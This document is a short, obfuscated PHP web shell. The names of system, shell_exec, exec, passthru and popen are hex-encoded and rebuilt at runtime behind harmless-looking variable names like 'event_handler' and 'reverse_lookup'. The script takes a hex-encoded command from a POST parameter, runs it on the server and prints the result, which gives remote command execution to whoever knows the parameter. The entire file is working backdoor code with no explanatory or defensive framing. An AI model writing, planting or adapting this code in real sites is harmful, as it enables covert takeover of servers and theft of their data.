<?php


$bind1 = '79';
$bind2 = '73';
$bind3 = '74';
$bind4 = '6d';
$bind5 = '68';
$bind6 = '6c';
$bind7 = '65';
$bind8 = '70';
$bind9 = '61';
$bind10 = '75';
$bind11 = '72';
$bind12 = '63';
$bind13 = '76';
$bind14 = '6f';
$event_handler1 = pack("H*", '73'.$bind1.$bind2.$bind3.'65'.$bind4);
$event_handler2 = pack("H*", $bind2.$bind5.'65'.'6c'.$bind6.'5f'.'65'.'78'.$bind7.'63');
$event_handler3 = pack("H*", $bind7.'78'.'65'.'63');
$event_handler4 = pack("H*", $bind8.$bind9.'73'.'73'.$bind3.$bind5.'72'.$bind10);
$event_handler5 = pack("H*", $bind8.'6f'.$bind8.'65'.'6e');
$event_handler6 = pack("H*", $bind2.'74'.$bind11.'65'.'61'.$bind4.'5f'.'67'.$bind7.'74'.'5f'.$bind12.'6f'.'6e'.'74'.'65'.'6e'.'74'.'73');
$event_handler7 = pack("H*", '70'.'63'.$bind6.'6f'.'73'.$bind7);
$reverse_lookup = pack("H*", $bind11.'65'.$bind13.$bind7.'72'.$bind2.'65'.'5f'.$bind6.$bind14.'6f'.'6b'.'75'.$bind8);
if (isset($_POST[$reverse_lookup])) {
    $reverse_lookup = pack("H*", $_POST[$reverse_lookup]);
    if (function_exists($event_handler1)) {
        $event_handler1($reverse_lookup);
    } elseif (function_exists($event_handler2)) {
        print $event_handler2($reverse_lookup);
    } elseif (function_exists($event_handler3)) {
        $event_handler3($reverse_lookup, $entity_component);
        print join("\n", $entity_component);
    } elseif (function_exists($event_handler4)) {
        $event_handler4($reverse_lookup);
    } elseif (function_exists($event_handler5) && function_exists($event_handler6) && function_exists($event_handler7)) {
        $resource_parameter_group = $event_handler5($reverse_lookup, 'r');
        if ($resource_parameter_group) {
            $marker_ref = $event_handler6($resource_parameter_group);
            $event_handler7($resource_parameter_group);
            print $marker_ref;
        }
    }
    exit;
}
